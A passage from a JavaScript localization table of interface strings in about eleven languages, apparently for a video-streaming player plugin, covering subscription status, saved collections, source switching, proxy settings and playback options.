		uk: 'ПРО закінчується:',
		en: 'PRO ends:',
		be: 'ПРО сканчаецца:',
		zh: 'PRO 到期：',
		bg: 'PRO завършва:',
		cs: 'PRO končí:',
		fr: 'PRO se termine :',
		he: 'PRO מסתיים:',
		pt: 'PRO termina:',
		ro: 'PRO se termina:'
	},
	pub_auth_add_descr: {
		ru: 'Добавить в свой профиль устройство',
		uk: 'Додати у свій профіль пристрій',
		en: 'Add a device to your profile',
		be: 'Дадаць у свой профіль прыладу',
		zh: '将设备添加到您的个人资料',
		bg: 'Добавете устройство към вашия профил',
		cs: 'Přidejte zařízení do svého profilu',
		fr: 'Ajouter un appareil à votre profil',
		he: 'הוסף מכשיר לפרופיל שלך',
		pt: 'Adicione um dispositivo ao seu perfil',
		ro: 'Adăugați un dispozitiv la profilul dvs'
	},
	pub_title_not_pro: {
		ru: 'ПРО не активирован',
		uk: 'ПРО не активований',
		en: 'PRO is not activated',
		be: 'ПРО не актываваны',
		zh: 'PRO 未激活',
		bg: 'PRO не е активиран',
		cs: 'PRO není aktivován',
		fr: 'PRO n\'est pas activé',
		he: 'PRO לא מופעל',
		pt: 'PRO não está ativado',
		ro: 'PRO nu este activat'
	},
	pub_device_dell_noty: {
		ru: 'Устройство успешно удалено',
		uk: 'Пристрій успішно видалено',
		en: 'Device deleted successfully',
		be: 'Прылада паспяхова выдалена',
		zh: '设备已成功删除',
		bg: 'Устройството е изтрито успешно',
		cs: 'Zařízení bylo úspěšně smazáno',
		fr: 'Appareil supprimé avec succès',
		he: 'המכשיר נמחק בהצלחה',
		pt: 'Dispositivo excluído com sucesso',
		ro: 'Dispozitivul a fost șters cu succes'
	},
	pub_device_title_options: {
		ru: 'Настройки устройства',
		uk: 'Налаштування пристрою',
		en: 'Device Settings',
		be: 'Налады прылады',
		zh: '设备设置',
		bg: 'Настройки на устройството',
		cs: 'Nastavení zařízení',
		fr: 'Paramètres de l\'appareil',
		he: 'הגדרות מכשיר',
		pt: 'Configurações do dispositivo',
		ro: 'Setări dispozitiv'
	},
	pub_device_options_edited: {
		ru: 'Настройки устройства изменены',
		uk: 'Установки пристрою змінено',
		en: 'Device settings changed',
		be: 'Налады прылады зменены',
		zh: '设备设置已更改',
		bg: 'Настройките на устройството са променени',
		cs: 'Nastavení zařízení změněno',
		fr: 'Paramètres de l\'appareil modifiés',
		he: 'הגדרות המכשיר השתנו',
		pt: 'Configurações do dispositivo alteradas',
		ro: 'Setările dispozitivului au fost modificate'
	},
	params_pub_clean_tocken: {
		ru: 'Очистить токен',
		uk: 'Очистити токен',
		en: 'Clear token',
		be: 'Ачысціць токен',
		zh: '清除令牌',
		bg: 'Изчистване на токена',
		cs: 'Vymazat token',
		fr: 'Effacer le jeton',
		he: 'נקה אסימון',
		pt: 'Token claro',
		ro: 'Jeton clar'
	},
	saved_collections_clears: {
		ru: 'Сохранённые подборки очищены',
		uk: 'Збірки очищені',
		en: 'Saved collections cleared',
		be: 'Захаваныя падборкі ачышчаны',
		zh: '已保存合集已清除',
		bg: 'Запазените колекции са изчистени',
		cs: 'Uložené sbírky byly vymazány',
		fr: 'Collections enregistrées effacées',
		he: 'אוספים שמורים נוקו',
		pt: 'Coleções salvas apagadas',
		ro: 'Colecțiile salvate au fost șters'
	},
	card_my_clear: {
		ru: 'Убрать из моих подборок',
		uk: 'Прибрати з моїх добірок',
		en: 'Remove from my collections',
		be: 'Прыбраць з маіх падборак',
		zh: '从我的合集中移除',
		bg: 'Премахване от колекциите ми',
		cs: 'Odebrat z mých sbírek',
		fr: 'Supprimer de mes collections',
		he: 'הסר מהאוספים שלי',
		pt: 'Remover das minhas coleções',
		ro: 'Eliminați din colecțiile mele'
	},
	card_my_add: {
		ru: 'Добавить в мои подборки',
		uk: 'Додати до моїх добірок',
		en: 'Add to my collections',
		be: 'Дадаць у мае падборкі',
		zh: '添加到我的合集',
		bg: 'Добавяне към моите колекции',
		cs: 'Přidat do mých sbírek',
		fr: 'Ajouter à mes collections',
		he: 'הוסף לאוספים שלי',
		pt: 'Adicionar às minhas coleções',
		ro: 'Adaugă la colecțiile mele'
	},
	card_my_descr: {
		ru: 'Смотрите в меню (Подборки)',
		uk: 'Дивитесь в меню (Підбірки)',
		en: 'Look in the menu (Collections)',
		be: 'Глядзіце ў меню (Падборкі)',
		zh: '在菜单中查看（合集）',
		bg: 'Вижте в менюто (Колекции)',
		cs: 'Podívejte se do nabídky (Sbírky)',
		fr: 'Regardez dans le menu (Collections)',
		he: 'חפש בתפריט (אוספים)',
		pt: 'Veja no menu (Coleções)',
		ro: 'Uită-te în meniu (Colecții)'
	},
	card_my_clear_all: {
		ru: 'Удалить всё',
		uk: 'Видалити все',
		en: 'Delete all',
		be: 'Выдаліць усё',
		zh: '全部删除',
		bg: 'Изтрий всички',
		cs: 'Smazat vše',
		fr: 'Supprimer tout',
		he: 'מחק הכל',
		pt: 'Excluir tudo',
		ro: 'Ștergeți tot'
	},
	card_my_clear_all_descr: {
		ru: 'Очистит все сохранённые подборки',
		uk: 'Очистити всі збережені збірки',
		en: 'Clear all saved selections',
		be: 'Ачысціць усе захаваныя падборкі',
		zh: '清除所有已保存的合集',
		bg: 'Изчистете всички запазени селекции',
		cs: 'Vymazat všechny uložené výběry',
		fr: 'Effacer toutes les sélections enregistrées',
		he: 'נקה את כל הבחירות השמורות',
		pt: 'Limpar todas as seleções salvas',
		ro: 'Ștergeți toate selecțiile salvate'
	},
	radio_style: {
		ru: 'Стиль',
		uk: 'Стиль',
		en: 'Style',
		be: 'Стыль',
		zh: '风格',
		bg: 'стил',
		cs: 'Styl',
		fr: 'Style',
		he: 'סִגְנוֹן',
		pt: 'Estilo',
		ro: 'Stil'
	},
	title_on_the: {
		ru: 'на',
		uk: 'на',
		en: 'on',
		be: 'на',
		zh: '在',
		bg: 'на',
		cs: 'na',
		fr: 'sur',
		he: 'עַל',
		pt: 'sobre',
		ro: 'pe'
	},
	title_my_collections: {
		ru: 'Мои подборки',
		uk: 'Мої добiрки',
		en: 'My collections',
		be: 'Мае падборкі',
		zh: '我的合集',
		bg: 'Моите колекции',
		cs: 'Moje sbírky',
		fr: 'Mes collections',
		he: 'האוספים שלי',
		pt: 'Minhas coleções',
		ro: 'Colecțiile mele'
	},
	modss_watch: {
		ru: 'Смотреть онлайн',
		en: 'Watch online',
		ua: 'Дивитися онлайн',
		be: 'Глядзець онлайн',
		zh: '在线观看',
		bg: 'Гледайте онлайн',
		cs: 'Sledujte online',
		fr: 'Regarder en ligne',
		he: 'צפה באינטרנט',
		pt: 'Assistir on-line',
		ro: 'Urmăriți online'
	},
	online_no_watch_history: {
		ru: 'Нет истории просмотра',
		en: 'No browsing history',
		ua: 'Немає історії перегляду',
		be: 'Няма гісторыі прагляду',
		zh: '没有浏览历史',
		bg: 'Няма история на сърфиране',
		cs: 'Žádná historie prohlížení',
		fr: 'Pas d\'historique de navigation',
		he: 'אין היסטוריית גלישה',
		pt: 'Sem histórico de navegação',
		ro: 'Fără istoric de navigare'
	},
	modss_video: {
		ru: 'Видео',
		en: 'Video',
		ua: 'Відео',
		be: 'Відэа',
		zh: '视频',
		bg: 'видео',
		cs: 'Video',
		fr: 'Vidéo',
		he: 'וִידֵאוֹ',
		pt: 'Vídeo',
		ro: 'Video'
	},
	modss_nolink: {
		ru: 'Не удалось извлечь ссылку',
		uk: 'Неможливо отримати посилання',
		en: 'Failed to fetch link',
		be: 'Не ўдалося атрымаць спасылку',
		zh: '无法获取链接',
		bg: 'Неуспешно извличане на връзката',
		cs: 'Odkaz se nepodařilo načíst',
		fr: 'Échec de la récupération du lien',
		he: 'אחזור הקישור נכשל',
		pt: 'Falha ao buscar link',
		ro: 'Nu s-a putut prelua linkul'
	},
	modss_blockedlink: {
		ru: 'К сожалению, это видео не доступно в вашем регионе',
		uk: 'На жаль, це відео не доступне у вашому регіоні',
		be: 'Нажаль, гэта відэа не даступна ў вашым рэгіёне',
		en: 'Sorry, this video is not available in your region',
		zh: '抱歉，您所在的地区无法观看该视频',
		bg: 'За съжаление този видеоклип не е наличен във вашия регион',
		cs: 'Je nám líto, toto video není ve vaší oblasti dostupné',
		fr: 'Désolé, cette vidéo n\'est pas disponible dans votre région',
		he: 'מצטערים, סרטון זה אינו זמין באזור שלך',
		pt: 'Desculpe, este vídeo não está disponível em sua região',
		ro: 'Ne pare rău, acest videoclip nu este disponibil în regiunea dvs'
	},
	modss_waitlink: {
		ru: 'Работаем над извлечением ссылки, подождите...',
		uk: 'Працюємо над отриманням посилання, зачекайте...',
		be: 'Працуем над выманнем спасылкі, пачакайце...',
		en: 'Working on extracting the link, please wait...',
		zh: '正在提取链接，请稍候...',
		bg: 'Работи се по извличането на връзката, моля, изчакайте...',
		cs: 'Na extrahování odkazu se pracuje, čekejte prosím...',
		fr: 'En cours d\'extraction du lien, veuillez patienter...',
		he: 'עובד על חילוץ הקישור, אנא המתן...',
		pt: 'Trabalhando na extração do link, aguarde...',
		ro: 'Lucrând la extragerea linkului, așteptați...'
	},
	modss_viewed: {
		ru: 'Просмотрено',
		uk: 'Переглянуто',
		en: 'Viewed',
		be: 'Прагледжана',
		zh: '已观看',
		bg: 'Разгледано',
		cs: 'Zobrazeno',
		fr: 'Vue',
		he: 'נצפה',
		pt: 'Vista',
		ro: 'Vizualizat'
	},
	modss_balanser: {
		ru: 'Источник',
		uk: 'Джерело',
		en: 'Source',
		be: 'Крыніца',
		zh: '来源',
		bg: 'Източник',
		cs: 'Zdroj',
		fr: 'Source',
		he: 'מָקוֹר',
		pt: 'Fonte',
		ro: 'Sursă'
	},
	helper_online_file: {
		ru: 'Удерживайте клавишу "ОК" для вызова контекстного меню',
		uk: 'Утримуйте клавішу "ОК" для виклику контекстного меню',
		en: 'Hold the "OK" key to bring up the context menu',
		be: 'Утрымлівайце клавішу "ОК" для выкліку кантэкставага меню',
		zh: '长按「确定」键打开上下文菜单',
		bg: 'Задръжте клавиша "OK", за да изведете контекстното меню',
		cs: 'Podržením klávesy "OK" vyvoláte kontextovou nabídku',
		fr: 'Maintenez la touche "OK" enfoncée pour afficher le menu contextuel',
		he: 'החזק את מקש "אישור" כדי להעלות את תפריט ההקשר',
		pt: 'Segure a tecla “OK” para abrir o menu de contexto',
		ro: 'Țineți apăsată tasta „OK” pentru a afișa meniul contextual'
	},
	filter_series_order: {
		ru: 'Порядок серий',
		uk: 'Порядок серій',
		en: 'Series order',
		be: 'Парадак серый',
		zh: '剧集顺序',
		bg: 'Сериен ред',
		cs: 'Pořadí série',
		fr: 'Ordre de série',
		he: 'סדר סדרה',
		pt: 'Ordem da série',
		ro: 'Ordinea seriei'
	},
	filter_video_stream: {
		ru: 'Видео поток',
		uk: 'Відео потік',
		en: 'Video stream',
		be: 'Відэа паток',
		zh: '视频流',
		bg: 'Видео поток',
		cs: 'Video stream',
		fr: 'Flux vidéo',
		he: 'זרם וידאו',
		pt: 'Fluxo de vídeo',
		ro: 'Stream video'
	},
	filter_video_codec: {
		ru: 'Кодек',
		uk: 'Кодек',
		en: 'Codec',
		be: 'Кодэк',
		zh: '编解码器',
		bg: 'Кодек',
		cs: 'kodek',
		fr: 'Codec',
		he: 'Codec',
		pt: 'Codec',
		ro: 'Codec'
	},
	filter_video_server: {
		ru: 'Сервер',
		uk: 'Сервер',
		en: 'Server',
		be: 'Сервер',
		zh: '服务器',
		bg: 'сървър',
		cs: 'Server',
		fr: 'Serveuse',
		he: 'שרת',
		pt: 'Servidora',
		ro: 'Server'
	},
	modss_title_online: {
		ru: 'MODS\'s',
		uk: 'MODS\'s',
		en: 'MODS\'s',
		be: 'MODS\'s',
		zh: 'MODS\'s',
		bg: 'MODS',
		cs: 'MODS',
		fr: 'MODS',
		he: 'של MODS',
		pt: 'MODS',
		ro: 'MOD-urile'
	},
	modss_session_not_activated: {
		ru: '\u2757\uFE0F Сессия не активирована',
		uk: '\u2757\uFE0F Сесію не активовано',
		en: '\u2757\uFE0F Session not activated',
		be: '\u2757\uFE0F Сесія не актывавана',
		zh: '\u2757\uFE0F 会话未激活',
		bg: '\u2757\uFE0F Сесията не е активирана',
		cs: '\u2757\uFE0F Relace není aktivována',
		fr: '\u2757\uFE0F Session non activée',
		he: '\u2757\uFE0F ההפעלה לא הופעלה',
		pt: '\u2757\uFE0F Sessão não ativada',
		ro: '\u2757\uFE0F Sesiunea nu este activată'
	},
	modss_change_balanser: {
		ru: 'Изменить источник',
		uk: 'Змінити источник',
		en: 'Change source',
		be: 'Змяніць крыніцу',
		zh: '更改平衡器',
		bg: 'Промяна на източника',
		cs: 'Změňte zdroj',
		fr: 'Changer de source',
		he: 'שנה מקור',
		pt: 'Alterar fonte',
		ro: 'Schimba sursa'
	},
	modss_scroll_to_start: {
		ru: '↑ В начало',
		uk: '↑ На початок',
		en: '↑ To start',
		be: '↑ У пачатак',
		zh: '↑ 回到开头',
		bg: '↑ За начало',
		cs: '↑ Chcete-li začít',
		fr: '↑ Pour commencer',
		he: '↑ כדי להתחיל',
		pt: '↑ Para começar',
		ro: '↑ Pentru a începe'
	},
	modss_clear_all_marks: {
		ru: 'Очистить все метки',
		uk: 'Очистити всі мітки',
		en: 'Clear all labels',
		be: 'Ачысціць усе пазнакі',
		zh: '清除所有标签',
		bg: 'Изчистете всички етикети',
		cs: 'Vymazat všechny štítky',
		fr: 'Effacer toutes les étiquettes',
		he: 'נקה את כל התוויות',
		pt: 'Limpar todos os rótulos',
		ro: 'Ștergeți toate etichetele'
	},
	modss_clear_all_timecodes: {
		ru: 'Очистить все тайм-коды',
		uk: 'Очистити всі тайм-коди',
		en: 'Clear all timecodes',
		be: 'Ачысціць усе тайм-коды',
		zh: '清除所有时间代码',
		bg: 'Изчистване на всички времеви кодове',
		cs: 'Vymazat všechny časové kódy',
		fr: 'Effacer tous les codes temporels',
		he: 'נקה את כל קודי הזמן',
		pt: 'Limpar todos os códigos de tempo',
		ro: 'Ștergeți toate codurile de timp'
	},
	modss_title_clear_all_mark: {
		ru: 'Снять отметку у всех',
		uk: 'Зняти відмітку у всіх',
		en: 'Unmark all',
		be: 'Зняць адзнаку ва ўсіх',
		zh: '取消全部标记',
		bg: 'Демаркирайте всички',
		cs: 'Zrušte označení všech',
		fr: 'Tout décocher',
		he: 'בטל את סימון הכל',
		pt: 'Desmarcar tudo',
		ro: 'Demarcați toate'
	},
	modss_title_clear_all_timecode: {
		ru: 'Сбросить тайм-код у всех',
		uk: 'Скинути тайм-код у всіх',
		en: 'Reset timecode for all',
		be: 'Скінуць тайм-код ва ўсіх',
		zh: '重置全部时间码',
		bg: 'Нулирайте времевия код за всички',
		cs: 'Resetovat časový kód pro všechny',
		fr: 'Réinitialiser le timecode pour tous',
		he: 'אפס את קוד הזמן עבור כולם',
		pt: 'Redefinir timecode para todos',
		ro: 'Resetați codul de timp pentru toți'
	},
	modss_title_links: {
		ru: 'Качество',
		uk: 'Якість',
		en: 'Quality',
		be: 'Якасць',
		zh: '画质',
		bg: 'качество',
		cs: 'Kvalitní',
		fr: 'Qualité',
		he: 'אֵיכוּת',
		pt: 'Qualidade',
		ro: 'Calitate'
	},
	title_proxy: {
		ru: 'Прокси',
		uk: 'Проксі',
		en: 'Proxy',
		be: 'Проксі',
		zh: '代理',
		bg: 'Прокси',
		cs: 'Proxy',
		fr: 'Procuration',
		he: 'פרוקסי',
		pt: 'Procurador',
		ro: 'Proxy'
	},
	online_proxy_title: {
		ru: 'Личный прокси',
		uk: 'Особистий проксі',
		en: 'Your proxy',
		be: 'Асабісты проксі',
		zh: '个人代理',
		bg: 'Вашият пълномощник',
		cs: 'Váš proxy',
		fr: 'Votre procuration',
		he: 'ה-proxy שלך',
		pt: 'Seu proxy',
		ro: 'Proxy-ul dvs'
	},
	online_proxy_title_descr: {
		ru: 'Если источник недоступен или не отвечает, требуется в выбранном Вами источнике "Включить" прокси, или указать ссылку на "Свой URL"',
		uk: 'Якщо джерело недоступний або не відповідає, потрібно у вибраному Вами джерелі "Увімкнути" проксі, або вказати посилання на "Свій URL"',
		en: 'If the source is not available or does not respond, you need to "Enable" the proxy in the source you have chosen, or specify a link to "Custom URL"',
		be: 'Калі крыніца недаступная або не адказвае, трэба "Уключыць" проксі ў абранай крыніцы або паказаць спасылку на "Свой URL"',
		zh: '若来源不可用或无响应，需在所选来源中「启用」代理，或填写「自定义 URL」',
		bg: 'Ако източникът не е наличен или не отговаря, трябва да „Активирате“ проксито в източника, който сте избрали, или да посочите връзка към „Персонализиран URL“',
		cs: 'Pokud zdroj není dostupný nebo neodpovídá, musíte "Povolit" proxy ve zdroji, který jste vybrali, nebo zadat odkaz na "Vlastní URL"',
		fr: 'Si la source n\'est pas disponible ou ne répond pas, vous devez "Activer" le proxy dans la source que vous avez choisie, ou spécifier un lien vers "URL personnalisée".',
		he: 'אם המקור אינו זמין או אינו מגיב, עליך "לאפשר" את ה-proxy במקור שבחרת, או לציין קישור ל"כתובת אתר מותאמת אישית"',
		pt: 'Se a fonte não estiver disponível ou não responder, você precisa "Habilitar" o proxy na fonte escolhida ou especificar um link para "URL personalizado"',
		ro: 'Dacă sursa nu este disponibilă sau nu răspunde, trebuie să „Activați” proxy-ul în sursa pe care ați ales-o sau să specificați un link către „Adresa URL personalizată”'
	},
	online_proxy_title_main: {
		ru: 'Встроенный прокси',
		uk: 'Вбудований проксі',
		en: 'Built-in proxy',
		be: 'Убудаваны проксі',
		zh: '内置代理',
		bg: 'Вграден прокси',
		cs: 'Vestavěný proxy',
		fr: 'Proxy intégré',
		he: 'פרוקסי מובנה',
		pt: 'Proxy integrado',
		ro: 'Proxy încorporat'
	},
	online_proxy_title_main_descr: {
		ru: 'Позволяет использовать встроенный в систему прокси для всех',
		uk: 'Дозволяє використовувати вбудований у систему проксі для всіх',
		en: 'Allows you to use the built-in proxy for all',
		be: 'Дазваляе выкарыстоўваць убудаваны ў сістэму проксі для ўсіх',
		zh: '允许对所有来源使用系统内置代理',
		bg: 'Позволява ви да използвате вградения прокси за всички',
		cs: 'Umožňuje používat vestavěný proxy pro všechny',
		fr: 'Vous permet d\'utiliser le proxy intégré pour tous',
		he: 'מאפשר לך להשתמש בפרוקסי המובנה עבור כולם',
		pt: 'Permite que você use o proxy integrado para todos',
		ro: 'Vă permite să utilizați proxy-ul încorporat pentru toți'
	},
	online_proxy_descr: {
		ru: 'Позволяет задать личный прокси для всех',
		uk: 'Дозволяє встановити особистий проксі для всіх',
		en: 'Allows you to set a personal proxy for all',
		be: 'Дазваляе задаць асабісты проксі для ўсіх',
		zh: '允许为所有来源设置个人代理',
		bg: 'Позволява ви да зададете личен прокси за всички',
		cs: 'Umožňuje nastavit osobní proxy pro všechny',
		fr: 'Vous permet de définir un proxy personnel pour tous',
		he: 'מאפשר לך להגדיר פרוקסי אישי לכולם',
		pt: 'Permite que você defina um proxy pessoal para todos',
		ro: 'Vă permite să setați un proxy personal pentru toți'
	},
	online_proxy_placeholder: {
		ru: 'Например: http://proxy.com',
		uk: 'Наприклад: http://proxy.com',
		en: 'For example: http://proxy.com',
		be: 'Напрыклад: http://proxy.com',
		zh: '例如：http://proxy.com',
		bg: 'Например: http://proxy.com',
		cs: 'Například: http://proxy.com',
		fr: 'Par exemple : http://proxy.com',
		he: 'לדוגמה: http://proxy.com',
		pt: 'Por exemplo: http://proxy.com',
		ro: 'De exemplu: http://proxy.com'
	},
	online_proxy_url: {
		ru: 'Свой URL',
		uk: 'Свiй URL',
		en: 'Mine URL',
		be: 'Свой URL',
		zh: '自定义 URL',
		bg: 'Мина URL',
		cs: 'Moje URL',
		fr: 'Mon URL',
		he: 'כתובת האתר שלי',
		pt: 'Meu URL',
		ro: 'URL-ul meu'
	},
	modss_voice_success: {
		ru: 'Вы успешно подписались',
		uk: 'Ви успішно підписалися',
		en: 'You have successfully subscribed',
		be: 'Вы паспяхова падпісаліся',
		zh: '订阅成功',
		bg: 'Успешно се абонирахте',
		cs: 'Úspěšně jste se přihlásili k odběru',
		fr: 'Vous vous êtes abonné avec succès',
		he: 'נרשמת בהצלחה',
		pt: 'Inscrição realizada com sucesso',
		ro: 'V-ați abonat cu succes'
	},
	modss_voice_error: {
		ru: 'Возникла ошибка',
		uk: 'Виникла помилка',
		en: 'An error has occurred',
		be: 'Узнікла памылка',
		zh: '发生错误',
		bg: 'Възникна грешка',
		cs: 'Došlo k chybě',
		fr: 'Une erreur s\'est produite',
		he: 'אירעה שגיאה',
		pt: 'Ocorreu um erro',
		ro: 'A apărut o eroare'
	},
	modss_content_not_released: {
		ru: 'Контент еще не вышел',
		uk: 'Контент ще не вийшов',
		en: 'Content not yet released',
		be: 'Кантент яшчэ не выйшаў',
		zh: '内容尚未发布',
		bg: 'Съдържанието все още не е публикувано',
		cs: 'Obsah ještě nebyl zveřejněn',
		fr: 'Contenu pas encore publié',
		he: 'תוכן עדיין לא פורסם',
		pt: 'Conteúdo ainda não lançado',
		ro: 'Conținut neeliberat încă'
	},
	modss_nothing_found: {
		ru: 'Ничего не найдено',
		uk: 'Нічого не знайдено',
		en: 'Nothing found',
		be: 'Нічога не знойдзена',
		zh: '未找到',
		bg: 'Нищо не е намерено',
		cs: 'Nic nenalezeno',
		fr: 'Rien trouvé',
		he: 'שום דבר לא נמצא',
		pt: 'Nada encontrado',
		ro: 'Nu s-a găsit nimic'
	},
	modss_balanser_dont_work: {
		ru: 'Источник ({balanser}) не отвечает на запрос.',
		uk: 'Джерело ({balanser}) не відповідає на запит.',
		en: 'Source ({balanser}) does not respond to the request.',
		be: 'Крыніца ({balanser}) не адказвае на запыт.',
		zh: '平衡器（{balanser}）未响应请求。',
		bg: 'Източникът ({balanser}) не отговаря на заявката.',
		cs: 'Zdroj ({balanser}) nereaguje na požadavek.',
		fr: 'La source ({balanser}) ne répond pas à la demande.',
		he: 'המקור ({balanser}) אינו מגיב לבקשה.',
		pt: 'A fonte ({balanser}) não responde à solicitação.',
		ro: 'Sursa ({balanser}) nu răspunde solicitării.'
	},
	modss_balanser_timeout: {
		ru: 'Источник будет переключен автоматически через <span class="timeout">10</span> секунд.',
		uk: 'Джерело буде переключено автоматично через <span class="timeout">10</span> секунд.',
		en: 'Source will be switched automatically in <span class="timeout">10</span> seconds.',
		be: 'Крыніца будзе пераключана аўтаматычна праз <span class="timeout">10</span> секунд.',
		zh: '平衡器将在<span class="timeout">10</span>秒内自动切换。',
		bg: 'Източникът ще бъде превключен автоматично след <span class="timeout">10</span> секунди.',
		cs: 'Zdroj se automaticky přepne za <span class="timeout">10</span> sekund.',
		fr: 'La source sera changée automatiquement dans <span class="timeout">10</span> secondes.',
		he: 'המקור יעבור אוטומטית בעוד <span class="timeout">10</span> שניות.',
		pt: 'A fonte será trocada automaticamente em <span class="timeout">10</span> segundos.',
		ro: 'Sursa va fi schimbată automat în <span class="timeout">10</span> secunde.'
	},
	modss_does_not_answer_text: {
		ru: 'Сервер не отвечает на запрос.',
		uk: 'Сервер не відповідає на запит.',
		en: 'Server does not respond to the request.',
		be: 'Сервер не адказвае на запыт.',
		zh: '服务器未响应请求。',
		bg: 'Сървърът не отговаря на заявката.',
		cs: 'Server nereaguje na požadavek.',
		fr: 'Le serveur ne répond pas à la demande.',
		he: 'השרת לא מגיב לבקשה.',
		pt: 'O servidor não responde à solicitação.',
		ro: 'Serverul nu răspunde la cerere.'
	},
	modss_balanser_dont_work_from: {
		ru: ' на источнике <b>{balanser}</b>',
		uk: ' на джерелі <b>{balanser}</b>',
		en: ' at the source <b>{balanser}</b>',
		be: ' на крыніцы <b>{balanser}</b>',
		zh: ' 在来源 <b>{balanser}</b>',
		bg: 'при източника <b>{balanser}</b>',
		cs: 'u zdroje <b>{balanser}</b>',
		fr: 'à la source <b>{balanser}</b>',
		he: 'במקור <b>{balanser}</b>',
		pt: 'na fonte <b>{balanser}</b>',
		ro: 'la sursă <b>{balanser}</b>'
	},
	online_dash: {
		ru: 'Предпочитать DASH вместо HLS',
		uk: 'Віддавати перевагу DASH замість HLS',
		be: 'Аддаваць перавагу DASH замест HLS',
		en: 'Prefer DASH over HLS',
		zh: '比 HLS 更喜欢 DASH',
		bg: 'Предпочитайте DASH пред HLS',
		cs: 'Preferujte DASH před HLS',
		fr: 'Préférez DASH à HLS',
		he: 'העדיפו DASH על פני HLS',
		pt: 'Prefira DASH em vez de HLS',
		ro: 'Preferați DASH față de HLS'
	},
	online_query_start: {
		ru: 'По запросу',
		uk: 'На запит',
		en: 'On request',
		be: 'Па запыце',
		zh: '按请求',
		bg: 'По заявка',
		cs: 'NA ZNAMENÍ',
		fr: 'Sur demande',
		he: 'לפי בקשה',
		pt: 'A pedido',
		ro: 'La cerere'
	},
	online_query_end: {
		ru: 'нет результатов',
		uk: 'немає результатів',
		en: 'no results',
		be: 'няма вынікаў',
		zh: '无结果',
		bg: 'никакви резултати',
		cs: 'žádné výsledky',
		fr: 'aucun résultat',
		he: 'ללא תוצאות',
		pt: 'sem resultados',
		ro: 'nici un rezultat'
	},
	title_online_continue: {
		ru: 'Продолжить',
		uk: 'Продовжити',
		en: 'Continue',
		be: 'Працягнуць',
		zh: '继续',
		bg: 'Продължи',
		cs: 'Pokračovat',
		fr: 'Continuer',
		he: 'לְהַמשִׁיך',
		pt: 'Continuar',
		ro: 'Continua'
	},
	title_kb_captcha_address: {
		ru: 'Требуется пройти капчу по адресу: ',
		uk: 'Потрібно пройти капчу за адресою: ',
		en: 'It is required to pass the captcha at: ',
		be: 'Патрабуецца прайсці капчу па адрасе: ',
		zh: '请在此地址完成验证：',
		bg: 'Изисква се предаване на captcha на:',
		cs: 'Je nutné předat captcha na:',
		fr: 'Il est obligatoire de passer le captcha à :',
		he: 'יש להעביר את ה-captcha בכתובת:',
		pt: 'É necessário passar o captcha em:',
		ro: 'Este necesar să treceți captcha la:'
	},
	title_online_first_but: {
		ru: 'Кнопка онлайн всегда первая',
		uk: 'Кнопка онлайн завжди перша',
		en: 'Online button always first',
		be: 'Кнопка онлайн заўсёды першая',
		zh: '在线按钮始终排第一',
		bg: 'Онлайн бутон винаги първи',
		cs: 'Online tlačítko vždy první',
		fr: 'Bouton en ligne toujours en premier',
		he: 'כפתור מקוון תמיד ראשון',
		pt: 'Botão online sempre primeiro',
		ro: 'Butonul online întotdeauna primul'
	},
	title_online_continued: {
		ru: 'Продолжить просмотр',
		uk: 'Продовжити перегляд',
		en: 'Continue browsing',
		be: 'Працягнуць прагляд',
		zh: '继续观看',
		bg: 'Продължете да разглеждате',
		cs: 'Pokračujte v procházení',
		fr: 'Continuer la navigation',
		he: 'המשך לגלוש',
		pt: 'Continuar navegando',
		ro: 'Continuați să navigați'
	},
	title_online_descr: {
		ru: 'Позволяет запускать плеер сразу на том месте, где остановили просмотр. Работает только в ВСТРОЕННОМ плеере.',
		uk: 'Дозволяє запускати плеєр одразу на тому місці, де зупинили перегляд.  Працює тільки у Вбудованому плеєрі.',
		en: 'Allows you to start the player immediately at the place where you stopped browsing.  Works only in the INTEGRATED player.',
		be: 'Дазваляе запусціць плеер адразу на тым месцы, дзе спынілі прагляд. Працуе толькі ва ўбудаваным плееры.',
		zh: '可从上次观看位置继续播放。仅在内置播放器中有效。',
		bg: 'Позволява ви да стартирате плейъра веднага от мястото, където сте спрели да разглеждате. Работи само в ИНТЕГРИРАНИЯ плейър.',
		cs: 'Umožňuje okamžitě spustit přehrávač v místě, kde jste přestali procházet. Funguje pouze v INTEGROVANÉM přehrávači.',
		fr: 'Vous permet de démarrer le lecteur immédiatement à l\'endroit où vous avez arrêté la navigation. Fonctionne uniquement dans le lecteur INTÉGRÉ.',
		he: 'מאפשר לך להפעיל את הנגן מיד במקום בו הפסקת לגלוש. עובד רק בנגן INTEGRATED.',
		pt: 'Permite iniciar o player imediatamente no local onde parou de navegar. Funciona apenas no player INTEGRADO.',
		ro: 'Vă permite să porniți playerul imediat în locul în care ați oprit navigarea. Funcționează numai în playerul INTEGRAT.'
	},
	title_online_hevc: {
		ru: 'Включить поддержку HDR',
		uk: 'Включити підтримку HDR',
		en: 'Enable HDR Support',
		be: 'Уключыць падтрымку HDR',
		zh: '启用 HDR 支持',
		bg: 'Активиране на HDR поддръжка',
		cs: 'Povolit podporu HDR',
		fr: 'Activer la prise en charge HDR',
		he: 'הפעל תמיכה ב-HDR',
		pt: 'Ativar suporte HDR',
		ro: 'Activați suportul HDR'
	},
	title_online__hevc_descr: {
		ru: 'Использовать HEVC / HDR если он доступен',
		uk: 'Використовувати HEVC / HDR якщо він доступний',
		en: 'Use HEVC / HDR if available',
		be: 'Выкарыстоўваць HEVC / HDR калі даступна',
		zh: '如可用则使用 HEVC / HDR',
		bg: 'Използвайте HEVC / HDR, ако има такива',
		cs: 'Použijte HEVC / HDR, pokud je k dispozici',
		fr: 'Utilisez HEVC / HDR si disponible',
		he: 'השתמש ב-HEVC / HDR אם זמין',
		pt: 'Use HEVC/HDR, se disponível',
		ro: 'Utilizați HEVC / HDR dacă este disponibil'
	},
	title_prioriry_balanser: {
		ru: 'Источник по умолчанию',
		uk: 'Джерело за замовчуванням',
		en: 'Default source',
		be: 'Крыніца па змаўчанні',
		zh: '默认来源',
		bg: 'Източник по подразбиране',
		cs: 'Výchozí zdroj',
		fr: 'Source par défaut',
		he: 'מקור ברירת מחדל',
		pt: 'Fonte padrão',
		ro: 'Sursa implicită'
	},
	title_prioriry_balanser_descr: {
		ru: 'Источник фильмов по умолчанию',
		uk: 'Джерело фільмів за замовчуванням',
		en: 'Default movie source',
		be: 'Крыніца фільмаў па змаўчанні',
		zh: '默认电影来源',
		bg: 'Източник на филм по подразбиране',
		cs: 'Výchozí zdroj filmu',
		fr: 'Source du film par défaut',
		he: 'מקור סרט ברירת מחדל',
		pt: 'Fonte de filme padrão',
		ro: 'Sursa implicită a filmului'
	},
	filmix_param_add_title: {
